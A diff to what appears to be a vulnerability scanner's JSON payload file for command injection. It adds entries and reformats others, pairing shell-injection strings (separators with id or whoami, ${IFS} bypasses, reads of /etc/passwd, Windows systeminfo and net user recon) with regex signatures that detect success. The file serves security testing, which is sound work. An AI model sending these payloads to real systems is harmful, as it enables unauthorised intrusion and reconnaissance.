@@ -1,35 +1,244 @@
 {
   "family": "command_injection",
-  "version": "1.0.0",
+  "version": "1.1.0",
   "categories": {
     "separators": [
-      {"payload": "; id",       "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 90, "depth": "basic"},
-      {"payload": "|id",        "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 90, "depth": "basic"},
-      {"payload": "&& id",      "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 90, "depth": "basic"},
-      {"payload": "`id`",       "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 85, "depth": "extended"},
-      {"payload": "$(id)",      "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 85, "depth": "extended"},
-      {"payload": "|| id",      "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 85, "depth": "extended"},
-      {"payload": "& id",       "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 80, "depth": "extended"},
-      {"payload": ";id #",      "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 80, "depth": "extended"},
-      {"payload": "%0a id",     "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 75, "depth": "aggressive"},
-      {"payload": "%26 id",     "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 75, "depth": "aggressive"},
-      {"payload": "%3b id",     "signature": "uid=\\d+\\([\\w-]+\\)", "confidence_hint": 75, "depth": "aggressive"},
-      {"payload": "| whoami",   "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",          "confidence_hint": 70, "depth": "basic"},
-      {"payload": "&& whoami",  "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",          "confidence_hint": 70, "depth": "extended"},
-      {"payload": "|| whoami",  "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",          "confidence_hint": 70, "depth": "extended"},
-      {"payload": "; whoami",   "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",          "confidence_hint": 70, "depth": "extended"}
+      {
+        "payload": "; id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 90,
+        "depth": "basic"
+      },
+      {
+        "payload": "|id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 90,
+        "depth": "basic"
+      },
+      {
+        "payload": "&& id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 90,
+        "depth": "basic"
+      },
+      {
+        "payload": "`id`",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 85,
+        "depth": "extended"
+      },
+      {
+        "payload": "$(id)",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 85,
+        "depth": "extended"
+      },
+      {
+        "payload": "|| id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 85,
+        "depth": "extended"
+      },
+      {
+        "payload": "& id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 80,
+        "depth": "extended"
+      },
+      {
+        "payload": ";id #",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 80,
+        "depth": "extended"
+      },
+      {
+        "payload": "%0a id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 75,
+        "depth": "aggressive"
+      },
+      {
+        "payload": "%26 id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 75,
+        "depth": "aggressive"
+      },
+      {
+        "payload": "%3b id",
+        "signature": "uid=\\d+\\([\\w-]+\\)",
+        "confidence_hint": 75,
+        "depth": "aggressive"
+      },
+      {
+        "payload": "| whoami",
+        "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",
+        "confidence_hint": 70,
+        "depth": "basic"
+      },
+      {
+        "payload": "&& whoami",
+        "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",
+        "confidence_hint": 70,
+        "depth": "extended"
+      },
+      {
+        "payload": "|| whoami",
+        "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",
+        "confidence_hint": 70,
+        "depth": "extended"
+      },
+      {
+        "payload": "; whoami",
+        "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",
+        "confidence_hint": 70,
+        "depth": "extended"
+      },
+      {
+        "payload": "| id",
+        "signature": "uid=\\d+\\([\\w.-]+\\)",
+        "confidence_hint": 90,
+        "depth": "basic",
+        "description": "Pipe + id (Linux)"
+      },
+      {
+        "payload": "%0aid",
+        "signature": "uid=\\d+\\([\\w.-]+\\)",
+        "confidence_hint": 80,
+        "depth": "extended",
+        "description": "Newline + id"
+      },
+      {
+        "payload": "& ver",
+        "signature": "Microsoft Windows \\[?Version|Windows IP Configuration",
+        "confidence_hint": 88,
+        "depth": "basic",
+        "description": "Windows & ver"
+      },
+      {
+        "payload": "| ver",
+        "signature": "Microsoft Windows \\[?Version|Windows IP Configuration",
+        "confidence_hint": 85,
+        "depth": "extended",
+        "description": "Windows pipe ver"
+      },
+      {
+        "payload": "&& ver",
+        "signature": "Microsoft Windows \\[?Version|Windows IP Configuration",
+        "confidence_hint": 85,
+        "depth": "extended",
+        "description": "Windows && ver"
+      },
+      {
+        "payload": "& ipconfig",
+        "signature": "Microsoft Windows \\[?Version|Windows IP Configuration",
+        "confidence_hint": 80,
+        "depth": "aggressive",
+        "description": "Windows & ipconfig"
+      },
+      {
+        "payload": ";${IFS}id",
+        "signature": "uid=\\d+\\([\\w.-]+\\)",
+        "confidence_hint": 80,
+        "depth": "aggressive",
+        "description": "Bypass espace via ${IFS}"
+      },
+      {
+        "payload": ";cat${IFS}/etc/passwd",
+        "signature": "root:.??:0:0:",
+        "confidence_hint": 80,
+        "depth": "aggressive",
+        "description": "IFS + lecture passwd"
+      },
+      {
+        "payload": "%26%26 id",
+        "signature": "uid=\\d+\\([\\w.-]+\\)",
+        "confidence_hint": 75,
+        "depth": "aggressive",
+        "description": "&& url-encode + id"
+      },
+      {
+        "payload": "%3Bid",
+        "signature": "uid=\\d+\\([\\w.-]+\\)",
+        "confidence_hint": 75,
+        "depth": "aggressive",
+        "description": "; url-encode + id"
+      },
+      {
+        "payload": "'|'id",
+        "signature": "uid=\\d+\\([\\w.-]+\\)",
+        "confidence_hint": 70,
+        "depth": "aggressive",
+        "description": "Casse une chaine quote + pipe id"
+      },
+      {
+        "payload": "&whoami",
+        "signature": "\\\\[\\w.$-]+$|nt authority",
+        "confidence_hint": 70,
+        "depth": "aggressive",
+        "description": "Windows & whoami"
+      }
     ],
     "recon": [
-      {"payload": "; uname -a", "signature": "Linux|Darwin", "confidence_hint": 80, "depth": "extended"},
-      {"payload": "& whoami",   "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",    "confidence_hint": 70, "depth": "extended"},
-      {"payload": "| ipconfig", "signature": "Windows IP Configuration", "confidence_hint": 80, "depth": "aggressive"},
-      {"payload": "; pwd",      "signature": "\\/(home|root|var|usr|srv|app)\\/[\\w./-]*", "confidence_hint": 65, "depth": "basic"},
-      {"payload": "| tasklist", "signature": "Image Name\\s+PID", "confidence_hint": 80, "depth": "extended"},
-      {"payload": "; ps -ef",   "signature": "UID\\s+PID\\s+PPID", "confidence_hint": 80, "depth": "extended"},
-      {"payload": "& ver",      "signature": "Microsoft Windows \\[Version", "confidence_hint": 85, "depth": "extended"},
-      {"payload": "& systeminfo", "signature": "OS Name:\\s*Microsoft Windows", "confidence_hint": 90, "depth": "aggressive"},
-      {"payload": "; cat /etc/passwd", "signature": "root:.*:0:0:", "confidence_hint": 90, "depth": "aggressive"},
-      {"payload": "& net user", "signature": "User accounts for", "confidence_hint": 80, "depth": "aggressive"}
+      {
+        "payload": "; uname -a",
+        "signature": "Linux|Darwin",
+        "confidence_hint": 80,
+        "depth": "extended"
+      },
+      {
+        "payload": "& whoami",
+        "signature": "[A-Za-z0-9][\\w.-]{0,62}\\\\[\\w.$-]{1,64}",
+        "confidence_hint": 70,
+        "depth": "extended"
+      },
+      {
+        "payload": "| ipconfig",
+        "signature": "Windows IP Configuration",
+        "confidence_hint": 80,
+        "depth": "aggressive"
+      },
+      {
+        "payload": "; pwd",
+        "signature": "\\/(home|root|var|usr|srv|app)\\/[\\w./-]*",
+        "confidence_hint": 65,
+        "depth": "basic"
+      },
+      {
+        "payload": "| tasklist",
+        "signature": "Image Name\\s+PID",
+        "confidence_hint": 80,
+        "depth": "extended"
+      },
+      {
+        "payload": "; ps -ef",
+        "signature": "UID\\s+PID\\s+PPID",
+        "confidence_hint": 80,
+        "depth": "extended"
+      },
+      {
+        "payload": "& ver",
+        "signature": "Microsoft Windows \\[Version",
+        "confidence_hint": 85,
+        "depth": "extended"
+      },
+      {
+        "payload": "& systeminfo",
+        "signature": "OS Name:\\s*Microsoft Windows",
+        "confidence_hint": 90,
+        "depth": "aggressive"
+      },
+      {
+        "payload": "; cat /etc/passwd",
+        "signature": "root:.*:0:0:",
+        "confidence_hint": 90,
+        "depth": "aggressive"
+      },
+      {
+        "payload": "& net user",
+        "signature": "User accounts for",
+        "confidence_hint": 80,
+        "depth": "aggressive"
+      }
     ]
   }
 }
